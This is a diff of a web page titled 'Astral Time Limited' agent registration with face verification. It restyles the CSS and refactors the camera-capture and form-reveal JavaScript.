@@ -7,8 +7,8 @@
 body {
   font-family: Arial, sans-serif;
   background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
-  height: 100vh;
   margin: 0;
+  height: 100vh;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -16,33 +16,45 @@ body {
 }
 .container {
   background: white;
-  padding: 20px;
-  border-radius: 10px;
+  padding: 30px;
+  border-radius: 12px;
   box-shadow: 0 8px 16px rgba(0,0,0,0.2);
   width: 90%;
   max-width: 400px;
   text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+button, input {
+  margin-top: 20px;
+  width: 90%;
+  padding: 10px;
+  border-radius: 5px;
+}
+button {
+  background: #007bff;
+  color: white;
+  border: none;
+}
+button:hover {
+  background: #0056b3;
 }
 video {
-  margin-top: 10px;
+  margin-top: 20px;
   width: 300px;
   height: 300px;
   object-fit: cover;
   border-radius: 50%;
   border: 5px solid #007bff;
-  transform: scaleX(-1); /* 镜像自拍 */
+  transform: scaleX(-1);
 }
 canvas { display: none; }
-button {
-  background: #007bff;
-  color: white;
-  border: none;
-  padding: 10px 20px;
-  margin-top: 10px;
-  border-radius: 5px;
-  cursor: pointer;
+p#status {
+  margin-top: 20px;
+  font-size: 14px;
+  color: red;
 }
-button:hover { background: #0056b3; }
 footer {
   margin-top: 30px;
   font-size: 12px;
@@ -55,19 +67,19 @@ footer {
 <h2>Astral Time Limited</h2>
 <h3>Agent Registration - Face Verification</h3>
 
-<button onclick="startCamera()">Start Camera</button><br><br>
-<video id="video" autoplay playsinline style="display:none;"></video><br>
+<button onclick="startCamera()" id="startBtn">Start Camera</button>
+<video id="video" style="display:none;" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
-<button onclick="captureFace()" style="display:none;" id="captureBtn">Capture Face</button>
+<button onclick="captureFace()" id="captureBtn" style="display:none;">Capture Face</button>
 
-<p id="status" style="color:red;margin-top:10px;"></p>
+<p id="status"></p>
 
 <form id="registerForm" style="display:none;">
-  <input type="text" id="fullname" placeholder="Full Name" required><br><br>
-  <input type="tel" id="phone" placeholder="Phone Number" required><br><br>
-  <input type="email" id="email" placeholder="Email Address" required><br><br>
-  <input type="text" id="country" placeholder="Country" required><br><br>
+  <input type="text" id="fullname" placeholder="Full Name" required>
+  <input type="tel" id="phone" placeholder="Phone Number" required>
+  <input type="email" id="email" placeholder="Email Address" required>
+  <input type="text" id="country" placeholder="Country" required>
   <button type="submit">Submit Registration</button>
 </form>
 
@@ -75,23 +87,25 @@ footer {
 </div>
 
 <script>
-let videoStream;
-const video = document.getElementById('video');
+let failCount = 0;
 
 function startCamera() {
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
-    videoStream = stream;
+  const video = document.getElementById('video');
+  const startBtn = document.getElementById('startBtn');
+  const captureBtn = document.getElementById('captureBtn');
+
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
     video.srcObject = stream;
     video.style.display = 'block';
-    document.getElementById('captureBtn').style.display = 'inline-block';
+    captureBtn.style.display = 'inline-block';
+    startBtn.style.display = 'none';
   }).catch(err => {
-    alert("Camera not available.");
+    alert("Camera access denied.");
   });
 }
 
-let failCount = 0;
-
 function captureFace() {
+  const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
   canvas.width = 300;
@@ -108,8 +122,8 @@ function captureFace() {
   .then(response => response.json())
   .then(data => {
     if (data.faces && data.faces.length === 1) {
-      document.getElementById('registerForm').style.display = 'block';
-      document.getElementById('status').innerText = "Face verification success! Please fill your details.";
+      document.getElementById('registerForm').style.display = 'flex';
+      document.getElementById('status').innerText = "Face verification success! Please fill in your information.";
     } else {
       failCount++;
       if (failCount >= 3) {
